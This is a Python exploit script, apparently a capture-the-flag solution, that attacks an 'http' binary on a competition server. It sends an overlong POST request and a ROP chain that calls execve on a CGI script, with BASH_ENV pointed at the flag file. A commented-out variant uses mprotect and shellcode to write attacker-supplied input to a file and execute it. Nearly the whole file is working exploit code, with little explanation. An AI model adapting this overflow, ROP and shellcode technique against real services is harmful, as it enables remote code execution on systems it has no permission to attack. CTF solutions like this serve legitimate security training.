#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './http'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'mitigator.ctfcompetition.com', 'port':1337})
env.select()

#==========

binf = ELF(bin_file)
addr_path           = binf.symbols['path']
addr_main           = binf.sep_function['main']

addr_buf = 0x10000000

#==========

def attack(conn):
    payload  = p64(addr_path + 0x10*2)
    payload += p64(0)
    payload += p64(addr_path + 0x10*2 + 0x28)
    payload += p64(0)
    payload += '/home/user/www/cgi-bin/login-to-sem.sh'.ljust(0x28, '\x00')
    payload += "BASH_ENV=/home/user/flag\x00"

    rop = ROP(binf)
    rop.execve(addr_path+0x10*2, addr_path, addr_path+0x10)
    rop.exit(0)
    """

    rop = ROP(binf)
    rop.mprotect(addr_path & ~0xfff, 0x1000, constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)

    shellasm  = shellcraft.mmap(addr_buf, 0x1000, 'PROT_READ|PROT_WRITE', 'MAP_PRIVATE|MAP_ANONYMOUS', -1, 0)
    shellasm += shellcraft.read('STDIN_FILENO', addr_buf, 0x1000)
    shellasm += shellcraft.open('/tmp/hoge', 'O_RDWR|O_CREAT', 0755)
    shellasm += 'push rax'
    shellasm += shellcraft.write('rax', addr_buf, 0x1000)
    shellasm += 'pop rdi'
    shellasm += shellcraft.close()
    shellasm += '''
    mov rax, SYS_execve
    lea rdi, [rip+arg0]
    push 0
    push rdi
    mov rsi, rsp
    lea rdx, [rip+env0]
    push 0
    push rdx
    mov rdx, rsp
    syscall

    arg0:
        .string "/home/user/www/cgi-bin/login-to-sem.sh"
    env0:
        .string "BASH_ENV=/tmp/hoge"
    '''
    shellcode = asm(shellasm)

    payload     = asm(shellcraft.read('STDIN_FILENO', addr_path+0x18, len(shellcode))).ljust(0x18, '\x90')
    """

    exploit  = 'POST /{path}? '.format(path=payload)
    exploit += 'a'*(0x408-1)
    exploit += p64(0xdeadbeef)
    exploit += str(rop)
    exploit += p64(addr_path)

    conn.sendline(exploit)
    '''
    sleep(0.1)
    conn.send(shellcode)
    '''

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
